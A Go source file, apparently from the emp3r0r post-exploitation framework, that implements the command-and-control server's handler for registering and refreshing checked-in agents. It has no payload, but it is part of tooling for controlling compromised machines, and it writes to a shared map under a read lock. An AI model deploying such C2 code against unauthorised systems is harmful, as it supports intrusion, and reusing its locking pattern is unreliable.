package server

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

// handleAgentCheckIn processes agent check-in requests.
func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
	conn, err := h2conn.Accept(wrt, req)
	defer func() {
		_ = conn.Close()
		if logging.Level >= 4 {
			logging.Debugf("handleAgentCheckIn finished")
		}
	}()
	if err != nil {
		logging.Errorf("handleAgentCheckIn: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	var target def.Emp3r0rAgent
	in := json.NewDecoder(conn)
	err = in.Decode(&target)
	if err != nil {
		logging.Warningf("handleAgentCheckIn decode error: %v", err)
		return
	}
	target.From = req.RemoteAddr
	if !agents.IsAgentExist(&target) {
		inx := agents.AssignAgentIndex()
		live.AgentControlMapMutex.RLock()
		live.AgentControlMap[&target] = &live.AgentControl{Index: inx, Conn: nil}
		live.AgentControlMapMutex.RUnlock()
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agents.AgentsJSON) {
			if l := agents.RefreshAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		logging.Printf("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
		agents.ListConnectedAgents()
	} else {
		for a := range live.AgentControlMap {
			if a.Tag == target.Tag {
				a = &target
				break
			}
		}
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agents.AgentsJSON) {
			if l := agents.RefreshAgentLabel(&target); l != "" {
				shortname = l
			}
		}
		if logging.Level >= 4 {
			logging.Debugf("Refreshing sysinfo for %s from %s, running %s", shortname, fmt.Sprintf("%s - %s", target.From, target.Transport), strconv.Quote(target.OS))
		}
	}
}
